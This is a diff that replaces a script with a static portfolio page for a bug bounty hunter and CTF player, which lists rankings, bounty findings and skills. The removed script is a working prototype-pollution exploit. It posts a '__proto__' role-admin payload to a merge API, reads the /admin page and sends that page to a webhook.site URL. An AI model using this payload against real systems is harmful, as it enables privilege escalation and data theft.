@@ -1,22 +1,223 @@
-<script>
-(async () => {
-  await fetch('/api/merge', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({
-      base:{},
-      override:{
-        "__proto__":{
-          role:"admin"
-        }
-      }
-    })
-  });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ritesh Ekbote | Security Researcher</title>
 
-  let res = await fetch('/admin');
-  let text = await res.text();
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
 
-  // send to webhook
-  fetch('https://webhook.site/bfd6fc04-83e8-42d5-ab4c-c65c246540a4' + btoa(text));
-})();
-</script>
+<style>
+:root {
+  --bg: #0b0b0c;
+  --card: #141416;
+  --text: #eaeaea;
+  --muted: #9a9a9a;
+  --accent: #ff3b3b;
+  --border: #222;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.6;
+}
+
+.container {
+  max-width: 1100px;
+  margin: auto;
+  padding: 40px 20px;
+}
+
+h1 {
+  font-size: 3rem;
+  font-weight: 800;
+}
+
+h2 {
+  font-size: 1.6rem;
+  margin-bottom: 20px;
+}
+
+p {
+  color: var(--muted);
+}
+
+/* HERO */
+.hero {
+  padding: 80px 0;
+}
+
+.hero span {
+  color: var(--accent);
+}
+
+.badge {
+  font-size: 0.8rem;
+  color: var(--accent);
+  margin-bottom: 10px;
+}
+
+/* CARDS */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 20px;
+}
+
+.card {
+  background: var(--card);
+  padding: 20px;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  transition: 0.2s;
+}
+
+.card:hover {
+  border-color: var(--accent);
+  transform: translateY(-4px);
+}
+
+/* STATS */
+.stats {
+  display: flex;
+  gap: 40px;
+  margin-top: 30px;
+}
+
+.stat {
+  font-size: 1.5rem;
+  font-weight: 700;
+}
+
+.stat span {
+  display: block;
+  font-size: 0.8rem;
+  color: var(--muted);
+}
+
+/* TABLE */
+table {
+  width: 100%;
+  border-collapse: collapse;
+}
+
+td, th {
+  padding: 12px;
+  border-bottom: 1px solid var(--border);
+  text-align: left;
+}
+
+th {
+  color: var(--muted);
+  font-size: 0.8rem;
+}
+
+/* CONTACT */
+.contact a {
+  display: block;
+  margin-top: 10px;
+  color: var(--accent);
+  text-decoration: none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- HERO -->
+<section class="hero">
+  <div class="badge">Security Researcher · India</div>
+  <h1>Ritesh <span>Ekbote</span></h1>
+  <p>
+    Bug bounty hunter & CTF player focused on web exploitation, API security, and reverse engineering.
+  </p>
+
+  <div class="stats">
+    <div class="stat">8+ <span>Bounties</span></div>
+    <div class="stat">15+ <span>CTFs</span></div>
+    <div class="stat">#5 🇮🇳 <span>Best Rank</span></div>
+  </div>
+</section>
+
+<!-- CTF -->
+<section>
+  <h2>CTF Achievements</h2>
+  <div class="grid">
+    <div class="card">
+      <strong>#5 India · #21 Global</strong>
+      <p>OffSec Arctic Howl 2025</p>
+    </div>
+
+    <div class="card">
+      <strong>#14 Global</strong>
+      <p>HTB AI vs Human CTF</p>
+    </div>
+
+    <div class="card">
+      <strong>#22 Global</strong>
+      <p>Black Hat USA CTF</p>
+    </div>
+  </div>
+</section>
+
+<!-- BOUNTY -->
+<section>
+  <h2>Bug Bounty</h2>
+  <table>
+    <tr>
+      <th>Company</th>
+      <th>Issue</th>
+      <th>Impact</th>
+    </tr>
+
+    <tr>
+      <td>Zerodha</td>
+      <td>Information Disclosure</td>
+      <td>Rewarded</td>
+    </tr>
+
+    <tr>
+      <td>Nykaa</td>
+      <td>Admin + API Key Leak</td>
+      <td>Certificate</td>
+    </tr>
+
+    <tr>
+      <td>BrandMuscle</td>
+      <td>Data Exposure</td>
+      <td>Rewarded</td>
+    </tr>
+  </table>
+</section>
+
+<!-- SKILLS -->
+<section>
+  <h2>Skills</h2>
+  <div class="grid">
+    <div class="card">Web Exploitation</div>
+    <div class="card">API Pentesting</div>
+    <div class="card">Reverse Engineering</div>
+    <div class="card">Burp Suite · Nmap · Ghidra</div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<section class="contact">
+  <h2>Contact</h2>
+  <p>Open to security roles, pentesting work, and collaborations.</p>
+
+  <a href="#">LinkedIn</a>
+  <a href="#">HackerOne</a>
+  <a href="#">TryHackMe</a>
+</section>
+
+</div>
+
+</body>
+</html>
